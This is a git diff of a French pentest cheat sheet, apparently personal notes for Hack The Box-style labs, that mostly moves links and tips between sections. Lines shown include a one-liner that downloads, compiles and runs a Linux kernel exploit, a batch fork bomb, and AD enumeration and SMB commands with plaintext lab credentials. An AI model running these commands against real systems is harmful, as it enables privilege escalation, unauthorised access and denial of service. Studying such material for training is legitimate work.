@@ -268,6 +268,8 @@ allow-hotplug eth0
 
 - Récupérer les X derniers caratères d'une string --> `tail  -c 6`
 
+- Récupérer des fichiers en FTP passif : `wget -m --no-passive ftp://anonymous:anonymous@10.10.110.100`
+
 ---
 
 ## Windows - Commande
@@ -277,8 +279,6 @@ allow-hotplug eth0
 - `dir C:\*.ova /S | more` --> Recherche dans le système un fichier .ova
 
 - `netstat -anpe` --> Tout les flux actifs actutellement
-
-- TronScript --> Evalue le PC et remonte les problèmes
 
 - `powercfg /batteryreport` --> Sort un rapport sur l'état de la batterie (à faire en powershell)
 
@@ -295,6 +295,8 @@ Invoke-RestMethod -Uri $url -OutFile $dest`
 
 - Trouver un binaire précis en powershell --> `Get-ChildItem -Path C:\ -Filter mysql.exe -Recurse -ErrorAction SilentlyContinue`
 
+- MySQL powershell --> `.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "show databases;"`
+
 ---
 
 ## Malware
@@ -303,10 +305,6 @@ Invoke-RestMethod -Uri $url -OutFile $dest`
 - [Virus Total](https://www.virustotal.com/gui/home/upload) --> étudier un fichier
 
 - https://github.com/CYB3RMX/Qu1cksc0pe --> Etude fichier local
-
-- MRT --> Analyse PC (application au sein de Windows)
-
-- HOIC --> Attaque DDOS
 
 - [GTFObins](https://gtfobins.github.io/) (liste de binaires vulnérables avec POC)
 	- Lister les SUIDS --> `find / -perm /4000 2>/dev/null`
@@ -323,23 +321,13 @@ Invoke-RestMethod -Uri $url -OutFile $dest`
 
 - [USB Payload](https://github-wiki-see.page/m/hak5darren/USB-Rubber-Ducky/wiki/Payloads) (liste payloads pour attaque via USB)
 
-- Browerling --> Permet de sandboxer un lien 
-- OnWorks --> Sandbox de distribution Linux au sein du naviguateur
-- [Sandbox](https://sandboxie-plus.com/) --> Sandbox standalone
-
-- Test PC (tronScript) --> [Tron](https://www.reddit.com/r/TronScript/wiki/downloads/)
-
 - Kernel exploit --> `wget https://raw.githubusercontent.com/kkamagui/linux-kernel-exploits/master/kernel-4.10.0-28-generic/CVE-2017-16995/CVE-2017-16995.c && gcc CVE-2017–16995.c -o CVE-2017–16995 && ./CVE-2017-16995`
-
-- Analyser un mail --> https://mailheader.org/
 
 ### Windows 
 
 - `ECHO@OFF start` (mettre le fichier en .bat) --> lance des choses à la suite
 
 - `%0|%0` (mettre le fichier en .bat) --> Ralentis l'ordinateur
-
-- Récupérer des fichiers en FTP passif : `wget -m --no-passive ftp://anonymous:anonymous@10.10.110.100`
 
 ### Active Directory - AD
 
@@ -348,7 +336,7 @@ Invoke-RestMethod -Uri $url -OutFile $dest`
   	- Lister les répertoires avec des identifiants --> `crackmapexec smb 10.10.110.3 -u 'mrb3n' -p 'W3lc0me123!!!' --shares`
   	- Accèder à un répertoires avec des identifiants --> `smbclient -U 'mrb3n%W3lc0me123!!!' //10.10.110.3/Backups`
   	- Récupérer tout les fichiers d'un partage --> `recurse ON;mget *`
-
+ 
 - Récupérer les comptes du domaines [kerbrute](https://github.com/ropnop/kerbrute) --> `./kerbrute_linux_amd64 userenum --dc frizzdc.frizz.htb -d frizz.htb /usr/share/wordlists/usernames.txt `
 
 - CrackMapExec (énumérer les politiques de sécurité AD) --> `crackmapexec smb $TARGET --pass-pol -u '' -p ''`
@@ -442,6 +430,7 @@ SQL (sophie  dbo@master)> EXEC xp_cmdshell 'whoami';
 - https://intelx.io/ --> Recherche de leak
 - https://facecheck.id/ --> Recherche par visage
 - Framework --> https://osintframework.com/
+- Analyser un mail --> https://mailheader.org/
 
 - [EPIOS](https://epieos.com/)
 - [Shodan](https://www.shodan.io/)
@@ -533,6 +522,7 @@ SQL (sophie  dbo@master)> EXEC xp_cmdshell 'whoami';
 
 - Diagnostic PC --> https://userdiag.com/
 - Dévrerouiler BIOS --> https://bios-pw.org/
+- Test PC (tronScript) --> [Tron](https://www.reddit.com/r/TronScript/wiki/downloads/)
 
 ### Other
 
@@ -546,6 +536,9 @@ SQL (sophie  dbo@master)> EXEC xp_cmdshell 'whoami';
 - Générer des tableaux LATEX --> https://www.tablesgenerator.com/ ou https://tableconvert.com/latex-generator
 - Schéma MD --> https://support.typora.io/Draw-Diagrams-With-Markdown/
 - [Calcul CVSS](https://cvss.js.org/)
+- Browerling --> Permet de sandboxer un lien 
+- OnWorks --> Sandbox de distribution Linux au sein du naviguateur
+- [Sandbox](https://sandboxie-plus.com/) --> Sandbox standalone
   
 ---
 
